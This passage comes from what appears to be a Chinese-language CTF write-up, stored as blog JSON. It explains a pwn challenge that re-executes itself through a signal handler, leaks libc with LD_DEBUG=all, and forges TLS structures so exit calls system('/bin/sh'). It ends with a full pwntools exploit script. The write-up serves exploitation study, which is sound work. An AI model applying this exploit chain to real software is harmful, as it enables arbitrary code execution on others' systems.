Group的进程\n\n\nSIGSEGV\n非法内存访问\n\n\nSIGSTKFLT\nLinux专用，数学协处理器的栈异常\n\n\nSIGSTOP\n中止进程。无法处理和忽略。\n\n\nSIGSYS\n非法系统调用\n\n\nSIGTERM\n请求中止进程，kill命令缺省发送\n\n\nSIGTHAW\nSolaris专用，从Suspend恢复时候发送\n\n\nSIGTRAP\n实现相关的硬件异常。一般是调试异常\n\n\nSIGTSTP\nSuspend Key，一般是Ctrl+Z。发送给所有Foreground Group的进程\n\n\nSIGTTIN\n当Background Group的进程尝试读取Terminal的时候发送\n\n\nSIGTTOU\n当Background Group的进程尝试写Terminal的时候发送\n\n\nSIGURG\n当out-of-band data接收的时候可能发送\n\n\nSIGUSR1\n用户自定义signal 1\n\n\nSIGUSR2\n用户自定义signal 2\n\n\nSIGVTALRM\nsetitimer函数设置的Virtual Interval Timer超时的时候\n\n\nSIGWAITING\nSolaris Thread Library内部实现专用\n\n\nSIGWINCH\n当Terminal的窗口大小改变的时候，发送给Foreground Group的所有进程\n\n\nSIGXCPU\n当CPU时间限制超时的时候\n\n\nSIGXFSZ\n进程超过文件大小限制\n\n\nSIGXRES\nSolaris专用，进程超过资源限制的时候发送\n\n\nreadlink该函数用于获取当前程序的绝对路径\n其一共有三个参数 第一个参数代表一个符号链接 第二个参数代表要存储的空间 第三个参数代表多少字节\n而&#x2F;proc&#x2F;self&#x2F;exe指向当前程序的绝对路径 所以原题中的\nreadlink(&quot;/proc/self/exe&quot;, v2, 0x4FuLL);\n\n就相当于获取当前程序的绝对路径 并且存储到v2内存空间中\nexecve配合上面我们得到v2中存储的是当前程序的绝对路径\n题目中的这一行 相当于就是重新运行了程序\nexecve(v2, *&amp;buf[56], *&amp;buf[48]);\n\n第二个和第三个参数用来规定新线程中的argv和envp参数\nargv简单来说 argv就是传入main函数的参数数组 其中argv[0]是程序名 本题中main函数一开就对argv的参数做了检测\nv4 = a2[1];  if ( !strcmp(v4, &quot;dbg&quot;) )    sub_1B70();  if ( strcmp(v4, &quot;run&quot;) )  &#123;LABEL_2:    puts(&quot;Error.&quot;);    exit(0);  &#125;\n\n如果为dbg 那么就可以进入sub_1b70函数 这个函数中存在任意写的机会\n而如果程序的argv[1]参数不是run 就会终止程序 在远程环境中 默认就是以run为参数运行的程序 在我们本地复现的时候 需要注意手动加上参数\n\nio = process([&quot;./pwn&quot;,&#x27;run&#x27;])\n\nenvpenvp是main函数的第三个参数 用来存储环境变量的指针 而有这样一个环境变量 LD_DEBUG&#x3D;all\n其原本是用来查看链接库的情况 从而诊断报错 但是其在输出一系列信息的同时 会顺带输出libc地址\n\n解题思路到此为之 题目的核心考点其实比较明了了  就是利用信号14的handler函数来重新启动程序  并且我们可以控制argv的参数 使其为dbg 我们就可以进入漏洞函数\n为了实现这一点 我们需要触发abort 而本题开启了canary 并且在输入index或者是size时 存在了单字节的溢出 可以覆盖到canary的最后一个字节 那么当check触发时 调用__stack_chk_fail函数时 其内部会通过libc_message函数来输出报错信息 其中就会调用到abort函数\n\n但是还有一个问题我们没有办法解决 虽然dgb函数中给了我们任意地址读和任意地址写的功能 但是开启了PIE保护的情况下 我们要如何获取libc地址来构造rop链呢\n就是利用将程序的环境变量指针替换为指向LD_DEBUG&#x3D;all字符串的指针 从而泄露libc\n你可以注意到 在我们输入username后的下一个输入点 存在2字节的溢出 而后面的内容正好是envp环境变量\n\n\n同时你可以发现sub_14b0函数 可以泄露出栈地址的后两个字节\n\n而我们如果在一开始的username中输入LD_DEBUG&#x3D;all字符串 那么此时就可以在对应的偏移中看到指向该字符串的指针  \n配合该偏移 我们可以在后续的溢出中将环境变量的指针替换成指向LD_DEBUG&#x3D;all字符串 从而在程序重新运行的时候输出libc基址\nexit调用链void __noreturn sub_1B70()&#123;  char *s[9]; // [rsp+0h] [rbp+0h] BYREF  s[1] = __readfsqword(0x28u);  puts(&quot;Please don&#x27;t patch this normal function, we will check it!&quot;);  puts(&quot;[+] Debug the note.&quot;);  s[0] = 0LL;  __printf_chk(1LL, &quot;[Addr] &quot;);  read(0, s, 8uLL);  __printf_chk(1LL, &quot;[Read] &quot;);  puts(s[0]);  __printf_chk(1LL, &quot;[Addr] &quot;);  read(0, s, 8uLL);  __printf_chk(1LL, &quot;[Write] &quot;);  read(0, s[0], 0x90uLL);  exit(0);&#125;\n\n可以看到dbg函数虽然给了任意地址读和任意地址写 看起来好像我们可以往栈上写入rop链 随后劫持程序执行流 但是实际不会执行到leave和ret来结束栈帧 就会触发exit 所以我们这里只能通过布局tls结构体来控制exit函数\n2.35以上的版本  exit函数内部调用了__run_exit_handlers函数 \n\n而该函数内部又调用了一个关键的函数 可以供我们实现任意函数调用\n\n下面跟着我来分析一下如何构造tls结构体 以此来实现system函数调用\n\n这里的rbx的值通常是不会变化的 其取决于rip索引 我们这里需要使得je跳转失败 从而才能进入任意函数调用的部分\n这里的rbp取值是根据tls结构体低地址处 我们计算好偏移以后 利用dgb函数的任意写机会将其修改不为0后即可不跳转\n\n这部分的内容是新版本加入的指针保护机制  通过循环右移11位后和tls结构体中的key异或后解密指针\n当然我们拥有tls结构体任意写的权限话 很容易就能绕过 我们只需要使得rax一开始为0 设置fs:0x30处为system函数\n异或过后rax的值就被设置成了system函数地址\n而rdi寄存器的参数取决于rbp寄存器 rbp寄存器的值取决于我们一开始任意写的地址 fs_base-88处存放的值\n计算好偏移 我们可以得到下面的payload 其可以实现call system 并且rdi参数为binsh\npayload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr)\n\n但是你会发现system函数会卡在这里\n\n这是因为我们破坏了tls结构体  我们把断点打在pthread_setcancelstate\n看看rdx寄存器是怎么样赋值的\n\n于是fs_base+0x10处的值不能被破坏 我们通过观察原本的tls结构会发现 其和fs_base+0x8处 是构成一个链表 由偏移0x10处指向偏移0x8处 而偏移0x8处指向自身\n\n但是经过我实际测试 我们只需要保证fs:0x10处的地址+0x971后 是一个可读的内存地址即可 也就是说libc_addr-0x972也可以通过\n那么最后的payload即为:\npayload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)+p64(libc_addr-0x972)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr)\n\n完整expfrom pwn import*from ctypes import *io = process([&quot;./pwn&quot;,&#x27;run&#x27;])#io = remote(&quot;175.20.26.10&quot;,9999)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)io.recvuntil(&quot;UserName: &quot;)io.sendline(b&#x27;LD_DEBUG=all&#x27;)io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)# gdb.attach(io,&#x27;b *$rebase(0x150D)&#x27;)# pause(0)io.sendline(&quot;++--++--&quot;)# pause()io.recvuntil(&quot;Super note: &quot;)number = int(io.recv(5),10)success(hex(number))io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1730)&#x27;)# pause(0)number += 0x1cpayload = cyclic(0x30)+p16(number)io.send(payload)# pause()io.recvuntil(&quot;LD_DEBUG=all@Note $ &quot;)io.sendline(b&#x27;Note_Add&#x27;)io.recvuntil(&quot;Size: &quot;)payload = cyclic(0x19)# gdb.attach(io,&#x27;b *$rebase(0x17ff)&#x27;)# pause(0)io.send(payload)# pause()io.recvuntil(&quot;base: &quot;)libc_addr = int(io.recv(18),16)success(&quot;libc_addr :&quot;+hex(libc_addr))io.recvuntil(&quot;[Addr] &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1BF1)&#x27;)# pause(0)envp_addr = libc_addr + libc.sym[&#x27;environ&#x27;]io.send(p64(libc_addr))# pause()target = libc_addr - 0x2898 - 0x28 - 0x58stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;[Addr] &quot;)success(&quot;target_addr :&quot;+hex(target))# gdb.attach(io,&#x27;b *$rebase(0x1C32)&#x27;)# pause(0)io.send(p64(target))# pause()system_addr = libc_addr + libc.sym[&#x27;system&#x27;]payload = p64(target+0x8)+p64(0)+p64(target+0x18)+b&#x27;/bin/sh\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)+p64(libc_addr-0x972)payload = payload.ljust(0x88,b&#x27;\\x00&#x27;)+p64(system_addr)io.recvuntil(&quot;[Write] &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1C6A)&#x27;)# pause(0)io.send(payload)# pause()io.interactive()\n\n","categories":["栈"]}]